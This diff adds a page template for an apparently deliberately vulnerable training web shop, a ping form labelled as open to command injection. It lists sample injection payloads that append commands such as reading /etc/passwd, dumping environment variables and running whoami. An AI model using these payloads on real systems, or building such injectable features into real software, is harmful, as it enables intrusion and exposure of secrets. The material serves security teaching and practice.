@@ -1,0 +1,59 @@
+{% extends 'base.html' %}
+
+{% block title %}System Info - VulnShop{% endblock %}
+
+{% block content %}
+<div class="row">
+    <div class="col-12">
+        <!-- Vulnerability Warning -->
+        <div class="alert alert-danger">
+            <strong>V05:</strong> This page is vulnerable to Command Injection.<br>
+            Try: <code>localhost; cat /etc/passwd</code> or <code>localhost; whoami</code>
+        </div>
+
+        <h2>System Information</h2>
+
+        <div class="card mb-4">
+            <div class="card-header">
+                Network Test
+            </div>
+            <div class="card-body">
+                <form method="get" class="mb-3">
+                    <div class="input-group">
+                        <input type="text" class="form-control" name="host"
+                               value="{{ host }}" placeholder="Enter hostname or IP">
+                        <button type="submit" class="btn btn-primary">Ping Host</button>
+                    </div>
+                    <small class="text-muted">Test network connectivity to a host</small>
+                </form>
+            </div>
+        </div>
+
+        {% if output %}
+        <div class="card">
+            <div class="card-header">
+                Output
+            </div>
+            <div class="card-body">
+                <pre class="terminal-output">{{ output }}</pre>
+            </div>
+        </div>
+        {% endif %}
+
+        <div class="card mt-4">
+            <div class="card-header">
+                <h5>Command Injection Payloads</h5>
+            </div>
+            <div class="card-body">
+                <ul class="list-unstyled font-monospace small">
+                    <li><code>localhost; id</code> - Show current user</li>
+                    <li><code>localhost; cat /etc/passwd</code> - Read passwd file</li>
+                    <li><code>localhost; ls -la /</code> - List root directory</li>
+                    <li><code>localhost | whoami</code> - Pipe to whoami</li>
+                    <li><code>localhost && env</code> - Show environment variables</li>
+                </ul>
+            </div>
+        </div>
+    </div>
+</div>
+{% endblock %}
